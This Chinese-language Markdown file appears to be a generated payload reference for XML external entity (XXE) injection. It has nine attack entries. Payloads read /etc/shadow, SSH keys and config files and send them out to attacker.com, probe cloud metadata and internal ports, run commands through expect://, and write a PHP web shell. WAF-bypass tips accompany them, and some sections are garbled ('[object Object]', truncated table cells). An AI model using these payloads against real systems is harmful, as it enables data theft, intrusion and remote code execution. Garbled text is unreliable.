# XXE实体注入 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（9 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. XXE基础攻击

- **id:** `xxe-basic`
- **分类:** XXE实体注入 / 基础攻击
- **tags:** `xxe` `xml` `external` `entity`

XML外部实体注入基础攻击技术

**前置条件**

- 存在XML解析功能
- 外部实体未被禁用

**利用步骤**

#### 1. 探测XXE

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

基础XXE测试

| 片段 | 说明 | 类型 |
|---|---|---|
| `DOCTYPE` | 文档类型声明 | value |
| `ENTITY` | 定义实体 | value |
| `SYSTEM` | 引用外部资源 | value |
| `&xxe;` | 引用实体 | value |

#### 2. 读取文件

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

读取Windows文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `file://` | 文件协议 | method |
| `<!DOCTYPE>` | 文档类型声明 | tag |
| `<!ENTITY>` | 实体定义 | tag |
| `SYSTEM` | 外部实体引用 | keyword |

> platform: `windows`

#### 3. 读取PHP源码

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

使用PHP Filter读取源码

| 片段 | 说明 | 类型 |
|---|---|---|
| `php://filter` | PHP伪协议 | value |
| `convert.base64-encode` | Base64编码 | value |

#### 4. SSRF攻击

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

利用XXE进行SSRF

| 片段 | 说明 | 类型 |
|---|---|---|
| `169.254.169.254` | 云元数据IP | domain |
| `<!DOCTYPE>` | 文档类型声明 | tag |
| `<!ENTITY>` | 实体定义 | tag |
| `SYSTEM` | 外部实体引用 | keyword |

**WAF 绕过**

#### 参数实体

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

使用参数实体绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `%` | 参数实体引用符 | operator |
| `%xxe;` | 引用参数实体 | variable |

#### 编码绕过

```
<?xml version="1.0" encoding="UTF-16"?>
使用不同编码绕过WAF
```

使用编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `<?xml` | 命令/关键字 | command |

**教程**

[object Object]

---

### 2. 盲注XXE攻击

- **id:** `xxe-blind`
- **分类:** XXE实体注入 / 盲注XXE
- **tags:** `xxe` `blind` `oob` `xml`

无回显的XXE攻击技术

**前置条件**

- 存在XML解析
- 无直接回显

**利用步骤**

#### 1. 外部实体探测

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>
```

使用外部实体探测

| 片段 | 说明 | 类型 |
|---|---|---|
| `DOCTYPE` | 文档类型声明 | value |
| `ENTITY` | 定义实体 | value |
| `SYSTEM` | 外部系统资源 | value |
| `&xxe;` | 引用实体 | value |

#### 2. 参数实体

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>
```

使用参数实体

| 片段 | 说明 | 类型 |
|---|---|---|
| `%` | 参数实体标识符 | operator |
| `%xxe;` | 引用参数实体 | variable |

#### 3. OOB外带数据

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>

# xxe.dtd内容
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

OOB外带文件内容

| 片段 | 说明 | 类型 |
|---|---|---|
| `file://` | 文件协议 | method |
| `<!DOCTYPE>` | 文档类型声明 | tag |
| `<!ENTITY>` | 实体定义 | tag |
| `SYSTEM` | 外部实体引用 | keyword |
| `/etc/passwd` | 敏感文件路径 | path |
| `&#xx;` | HTML实体编码 | encoding |

**WAF 绕过**

#### 编码绕过

```
使用UTF-16编码XML文档
绕过WAF检测
```

编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用UTF-16编码XML文档 绕过WAF检测` | 攻击载荷 | value |

**教程**

[object Object]

---

### 3. XXE OOB外带攻击

- **id:** `xxe-oob`
- **分类:** XXE实体注入 / OOB外带
- **tags:** `xxe` `oob` `exfiltration` `xml`

利用OOB技术外带XXE数据

**前置条件**

- 存在XXE漏洞
- 可发起外部请求

**利用步骤**

#### 1. HTTP外带

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

HTTP外带数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">` | 参数实体引用远程恶意DTD文件 | command |
| `%xxe;` | 在DTD中展开参数实体，加载远程DTD | operator |
| `<!ENTITY % file SYSTEM "file:///etc/passwd">` | 在DTD中读取目标服务器本地文件 | value |
| `http://attacker.com/log?data=%file;` | 通过HTTP请求参数将文件内容外带 | value |

#### 2. FTP外带

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```

FTP外带数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `ftp://attacker.com/%file;` | 使用FTP协议外带数据，支持多行内容 | command |
| `%eval;` | 展开eval参数实体，动态构造外带实体 | operator |
| `%exfil;` | 触发外带请求，将数据发送到攻击者FTP服务器 | operator |

#### 3. DNS外带

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/log?file=/etc/passwd">
]>
<foo>&xxe;</foo>

# 或使用子域名
<!ENTITY xxe SYSTEM "http://filecontent.attacker.com/">
```

DNS外带

| 片段 | 说明 | 类型 |
|---|---|---|
| `http://filecontent.attacker.com/` | 将文件内容作为子域名通过DNS解析外带 | value |
| `&xxe;` | 在XML内容中引用通用实体触发请求 | operator |

**WAF 绕过**

#### 使用CDATA

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>
```

CDATA包装

| 片段 | 说明 | 类型 |
|---|---|---|
| `<![CDATA[` | XML CDATA段开始标记，内容不被XML解析器处理 | operator |
| `&xxe;` | 实体引用在CDATA之前被解析展开 | variable |
| `]]>` | CDATA段结束标记 | operator |

**教程**

[object Object]

---

### 4. XXE+SSRF组合攻击

- **id:** `xxe-ssrf`
- **分类:** XXE实体注入 / XXE+SSRF
- **tags:** `xxe` `ssrf` `combination` `xml`

利用XXE实现SSRF攻击

**前置条件**

- 存在XXE漏洞
- 内网可访问

**利用步骤**

#### 1. 扫描内网端口

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<foo>&xxe;</foo>

# 批量扫描
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
<!ENTITY xxe SYSTEM "http://192.168.1.1:443">
```

扫描内网端口

| 片段 | 说明 | 类型 |
|---|---|---|
| `<!ENTITY xxe SYSTEM` | 定义外部通用实体，支持多种协议 | command |
| `"http://192.168.1.1:22"` | 目标内网IP和端口，通过响应差异判断端口状态 | value |
| `&xxe;` | 在XML内容中引用实体触发HTTP请求 | operator |

#### 2. 访问内网服务

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/info">
]>
<foo>&xxe;</foo>

# 访问Redis
# 访问内部API
```

| 片段 | 说明 | 类型 |
|---|---|---|
| `127.0.0.1` | 本地回环 | domain |
| `<!DOCTYPE>` | 文档类型声明 | tag |
| `<!ENTITY>` | 实体定义 | tag |
| `SYSTEM` | 外部实体引用 | keyword |

**WAF 绕过**

#### 编码绕过

```
使用不同编码格式绕过IP过滤
```

编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `IP编码` | 使用十进制(2130706433)、十六进制(0x7f000001)、八进制(0177.0.0.1)绕过 | command |
| `URL编码` | 对URL进行单次或双重URL编码绕过过滤 | parameter |

**教程**

[object Object]

---

### 5. XXE到RCE

- **id:** `xxe-rce`
- **分类:** XXE实体注入 / XXE到RCE
- **tags:** `xxe` `rce` `php` `expect`

利用XXE实现远程代码执行

**前置条件**

- 存在XXE漏洞
- PHP expect扩展加载

**利用步骤**

#### 1. Expect扩展RCE

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<foo>&xxe;</foo>

# 执行任意命令
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">
```

使用expect协议执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `expect://` | PHP expect协议 | value |
| `whoami` | 要执行的命令 | command |

#### 2. 写入WebShell

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://echo '<?php eval($_POST[cmd]);?>' > /var/www/html/shell.php">
]>
<foo>&xxe;</foo>
```

| 片段 | 说明 | 类型 |
|---|---|---|
| `<!DOCTYPE>` | 文档类型声明 | tag |
| `<!ENTITY>` | 实体定义 | tag |
| `SYSTEM` | 外部实体引用 | keyword |

**WAF 绕过**

#### 编码绕过

```
使用Base64或其他编码绕过命令过滤
```

编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用Base64或其他编码绕过命令过滤` | 攻击载荷 | value |

**教程**

[object Object]

---

### 6. XXE文件读取

- **id:** `xxe-file-read`
- **分类:** XXE实体注入 / 文件读取
- **tags:** `xxe` `file` `read` `lfi`

利用XXE读取服务器文件

**前置条件**

- 存在XXE漏洞
- 有文件读取权限

**利用步骤**

#### 1. 读取Linux文件

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

# 其他敏感文件
file:///etc/shadow
file:///etc/hosts
file:///root/.ssh/id_rsa
file:///proc/self/environ
```

读取Linux系统文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `file://` | 本地文件协议 | value |
| `/etc/passwd` | 用户信息文件 | path |

> platform: `linux`

#### 2. 读取Windows文件

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>

# 其他敏感文件
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
```

读取Windows系统文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `<?xml version="1.0"?>` | XML声明/实体定义 | tag |
| `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">` | XML声明/实体定义 | tag |
| ` ]> <foo>&xxe;</foo>  # 其他敏感文件 file:///c:/windows/syste` | XML内容 | value |

> platform: `windows`

#### 3. 读取Web配置

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<foo>&xxe;</foo>

# 常见配置文件
file:///var/www/html/wp-config.php
file:///app/.env
file:///app/config/database.yml
```

读取Web应用配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `<?xml version="1.0"?>` | XML声明/实体定义 | tag |
| `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">` | XML声明/实体定义 | tag |
| ` ]> <foo>&xxe;</foo>  # 常见配置文件 file:///var/www/html/wp-` | XML内容 | value |

#### 4. 读取源代码

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<foo>&xxe;</foo>
```

使用PHP Filter读取源码

| 片段 | 说明 | 类型 |
|---|---|---|
| `<?xml version="1.0"?>` | XML声明/实体定义 | tag |
| `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resourc` | XML声明/实体定义 | tag |
| ` ]> <foo>&xxe;</foo>` | XML内容 | value |

**WAF 绕过**

#### 使用参数实体

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY bar "%xxe;">
]>
<foo>&bar;</foo>
```

参数实体绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `<?xml version="1.0"?>` | XML声明/实体定义 | tag |
| `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd">` | XML声明/实体定义 | tag |
| `<!ENTITY bar "%xxe;">` | XML声明/实体定义 | tag |
| ` ]> <foo>&bar;</foo>` | XML内容 | value |

**教程**

[object Object]

---

### 7. XXE外部DTD利用

- **id:** `xxe-dtd`
- **分类:** XXE实体注入 / 外部DTD
- **tags:** `xxe` `dtd` `external` `xml`

利用外部DTD文件进行XXE攻击

**前置条件**

- 存在XXE漏洞
- 可访问外部DTD

**利用步骤**

#### 1. 托管恶意DTD

```
# 在攻击者服务器创建evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

创建恶意DTD文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `<!ENTITY % file SYSTEM "file:///etc/passwd">` | 参数实体读取目标系统文件 | command |
| `&#x25;` | %的HTML实体编码，在实体定义中引用其他参数实体 | operator |
| `http://attacker.com/?d=%file;` | 通过HTTP请求参数外带文件内容 | value |

#### 2. 引用外部DTD

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>
```

引用外部DTD文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `<!DOCTYPE foo [` | DTD声明块开始 | command |
| `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">` | 定义参数实体指向远程恶意DTD文件 | command |
| `%xxe;` | 展开参数实体，加载并执行远程DTD中的定义 | operator |

#### 3. 多步骤外带

```
# evil.dtd - 多步骤外带
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "%start;%file;%end;">
```

处理特殊字符

| 片段 | 说明 | 类型 |
|---|---|---|
| `<![CDATA[` | CDATA开始标记，处理文件中的XML特殊字符 | operator |
| `%start;%file;%end;` | 拼接CDATA标记和文件内容，避免XML解析错误 | variable |
| `%all;` | 展开包含完整CDATA包裹数据的实体 | operator |

#### 4. 错误消息泄露

```
# 利用错误消息泄露数据
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

# 错误消息中会包含文件内容
```

错误消息外带

| 片段 | 说明 | 类型 |
|---|---|---|
| `file://` | 文件协议 | method |
| `<!ENTITY>` | 实体定义 | tag |
| `SYSTEM` | 外部实体引用 | keyword |
| `/etc/passwd` | 敏感文件路径 | path |
| `&#xx;` | HTML实体编码 | encoding |

**WAF 绕过**

#### 使用HTTPS

```
使用HTTPS托管DTD文件绕过HTTP过滤
```

HTTPS绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用HTTPS托管DTD文件绕过HTTP过滤` | 命令/关键字 | command |

**教程**

[object Object]

---

### 8. XLSX文件XXE

- **id:** `xxe-xlsx`
- **分类:** XXE实体注入 / XLSX文件XXE
- **tags:** `xxe` `xlsx` `excel` `office`

利用XLSX文件进行XXE攻击

**前置条件**

- 应用解析XLSX文件
- 存在XXE漏洞

**利用步骤**

#### 1. 解压XLSX文件

```
# XLSX本质是ZIP文件
unzip spreadsheet.xlsx

# 主要文件结构
xl/workbook.xml
xl/worksheets/sheet1.xml
xl/sharedStrings.xml
[Content_Types].xml
```

解压XLSX文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `unzip spreadsheet.xlsx` | XLSX是ZIP压缩包，直接解压获取内部XML文件 | command |
| `xl/workbook.xml` | 工作簿主配置文件，包含Sheet信息 | value |
| `xl/worksheets/sheet1.xml` | 工作表数据文件，包含单元格内容 | value |
| `[Content_Types].xml` | 内容类型定义文件，也可作为XXE注入点 | value |

#### 2. 注入XXE Payload

```
# 修改xl/workbook.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="...">
&xxe;
</workbook>
```

| 片段 | 说明 | 类型 |
|---|---|---|
| `file://` | 文件协议 | method |
| `<!DOCTYPE>` | 文档类型声明 | tag |
| `<!ENTITY>` | 实体定义 | tag |
| `SYSTEM` | 外部实体引用 | keyword |
| `/etc/passwd` | 敏感文件路径 | path |

**WAF 绕过**

#### 修改Content_Types

```
修改[Content_Types].xml注入XXE
```

修改Content_Types

| 片段 | 说明 | 类型 |
|---|---|---|
| `[Content_Types].xml` | XLSX中的内容类型定义文件，常被忽略 | value |
| `XXE注入` | 在此文件中注入XXE，绕过仅检查workbook.xml的WAF | command |

**教程**

[object Object]

---

### 9. DOCX文件XXE

- **id:** `xxe-docx`
- **分类:** XXE实体注入 / DOCX文件XXE
- **tags:** `xxe` `docx` `word` `office`

利用DOCX文件进行XXE攻击

**前置条件**

- 应用解析DOCX文件
- 存在XXE漏洞

**利用步骤**

#### 1. 解压DOCX文件

```
# DOCX本质是ZIP文件
unzip document.docx

# 主要文件结构
word/document.xml
word/_rels/document.xml.rels
[Content_Types].xml
```

解压DOCX文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `unzip document.docx` | DOCX是ZIP压缩包，解压获取内部XML | command |
| `word/document.xml` | 主文档内容文件，核心注入点 | value |
| `word/_rels/document.xml.rels` | 文档关系文件，也可作为注入点 | value |
| `[Content_Types].xml` | 内容类型定义，备选注入点 | value |

#### 2. 注入XXE Payload

```
# 修改word/document.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="...">
<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
</w:document>
```

| 片段 | 说明 | 类型 |
|---|---|---|
| `file://` | 文件协议 | method |
| `<!DOCTYPE>` | 文档类型声明 | tag |
| `<!ENTITY>` | 实体定义 | tag |
| `SYSTEM` | 外部实体引用 | keyword |
| `/etc/passwd` | 敏感文件路径 | path |

**WAF 绕过**

#### 修改关系文件

```
修改_rels/.rels或document.xml.rels注入XXE
```

修改关系文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `_rels/.rels` | DOCX根关系文件，定义文档各部分的关联 | value |
| `document.xml.rels` | 文档关系文件，常被WAF忽略的注入点 | value |
| `XXE注入` | 在关系文件中注入XXE实体绕过内容检测 | command |

**教程**

[object Object]
